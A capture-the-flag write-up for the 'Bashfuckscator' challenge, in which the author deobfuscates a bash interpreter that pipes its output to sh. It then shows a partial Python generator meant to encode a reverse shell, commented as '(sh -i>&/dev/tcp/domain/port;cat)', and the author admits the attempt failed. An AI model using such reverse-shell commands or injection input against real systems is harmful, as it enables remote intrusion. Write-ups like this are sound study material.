# Bashfuckscator

## Task

Our beloved code interpreter got attacked so we implemented some of the industries best security measurements.

nc chal.cybersecurityrumble.de 2946

## Solution

**Note**: I didn't solve this challenge

On connection we get:

```
Welcome to bashfuckscator!
Press L for code listing, or enter code.
```

After receiving the code we have to beautify and deobfuscate what's happening:

```bash
read data
while [ ${i:-0} -lt ${#data} ];do
  var="regs_${curreg:-0}"
  var="${var/-/_}"
  curc="${data:$i:1}"
  [ "${curc}" = "$(((i+0)%10))" ] && declare "${var}=$((${!var:-0}+1))"
  [ "${curc}" = "$(((i+1)%10))" ] && declare "${var}=$((${!var:-0}-1))"
  [ "${curc}" = "$(((i+2)%10))" ] && printf -- "\x$(printf "%02x" "${!var}")"
  [ "${curc}" = "$(((i+3)%10))" ] && curreg=$((${curreg:-0}+1))
  [ "${curc}" = "$(((i+4)%10))" ] && curreg=$((${curreg:-0}-1))
  [ "${curc}" = "$(((i+5)%10))" ] && echo "STDIN not implemented" && exit 1
  if [ "${curc}" = "$(((i+6)%10))" ];then
    oldd=${loopd:-0}
    loopd=$((oldd+1))
    declare "loops_$loopd=$i"
    if [ ${!var:-0} -eq 0 ];then
      while [ $oldd -lt $loopd ];do
        i=$((${i:-0}+1))
        if [ $i -eq ${#data} ];then
          echo "LOOP ERROR"
          exit 1
        fi
        if [ "${data:$i:1}" = "$(((i+6)%10))" ];then
          loopd=$((loopd+1))
        elif [ "${data:$i:1}" = "$(((i+7)%10))" ];then
          loopd=$((loopd-1))
        fi
      done
    fi
  elif [ "${curc}" = "$(((i+7)%10))" ];then
    lvar="loops_${loopd:-0}"
    i=$((${!lvar}-1))
    loopd=$((${loopd:-0}-1))
  fi
  i=$((${i:-0}+1))
done|sh
```

We iterate over each char of the data and have different actions defined on checks with the current index and value. So we have to input numbers.

We need to `printf` chars that are stored in `regs_${curreg:-0}`, because the output of the loop is execute via the pipe to `sh`. How do we control `var`?

The `printf` uses a variable indirection or expansion: https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Shell-Parameter-Expansion

So the first two ifs actually increment the value of `regs_${curreg}` which is also controlled by us via case 4 and 5.

The rest of the loop is not very interesting, the last if-elif really has nothing do to with the task.

So what I came up with was this:

 - Use only one register (`regs_0`), which was a mistake
 - Increment or decrement this register until it contains the next charcode of my command
 - Set the next number so that `printf` is called

 I started this challenge 30 minutes before the competition was about to end so instead of writing a proper script I just debugged the script locally to try a single command, quick and dirty:

 ```bash
 $ bash -x bashfucksator.sh
+ regs_0=0
+ read data
234
+ '[' 0 -lt 3 ']'
+ var=regs_0
+ var=regs_0
+ curc=2
+ '[' 2 = 0 ']'
+ '[' 2 = 1 ']'
+ '[' 2 = 2 ']'
+ sh
++ printf %02x 0
+ printf -- '\x00'
+ '[' 2 = 3 ']'
+ '[' 2 = 4 ']'
+ '[' 2 = 5 ']'
+ '[' 2 = 6 ']'
+ '[' 2 = 7 ']'
+ i=1
 ```

First number is `2` to increment, then `3` and so on, until we reach our desired charcode. Because I used only one register I had to move from lower ascii `> 97` back to `< 65` for special chars. This is actually less complex than creating virtual registers and managing them but it is less efficient and needs more numbers.

I piped a script generating these numbers to my local shell script. I wanted to execute a reverse shell so it looked like this:

```python
# (sh -i>&/dev/tcp/domain/port;cat)
o = ""
# (
o += (100*"0123456789")[:40]
o += str((int(o[-1]) + 3) % 10)
# s
o += (100*"1234567890")[:75]
o += str((int(o[-1]) + 3) % 10)
# h
o += "89012345678"
o += str((int(o[-1]) + 2) % 10)
# " "
o += (100*"0123456789")[:72]
o += str((int(o[-1]) + 2) % 10)
# -
o += "2345678901234"
o += str((int(o[-1]) + 3) % 10)
# i
o += (100*"6789012345")[:60]
o += str((int(o[-1]) + 3) % 10)
# >
o += (100*"8901234567")[:43]
o += str((int(o[-1]) + 2) % 10)
# &
o += (100*"2345678901")[:24]
o += str((int(o[-1]) + 2) % 10)
# /
o += (100*"6789012345")[:9]
o += str((int(o[-1]) + 3) % 10)
```

And there was my second mistake, that command wouldn't even work, the shell was immediately closed. Instead of doing things by hand I sould've made a script from the beginning.

After the CTF ended I tried different commands, none of them succeeded remotely. Only locally. Not sure what was happening.
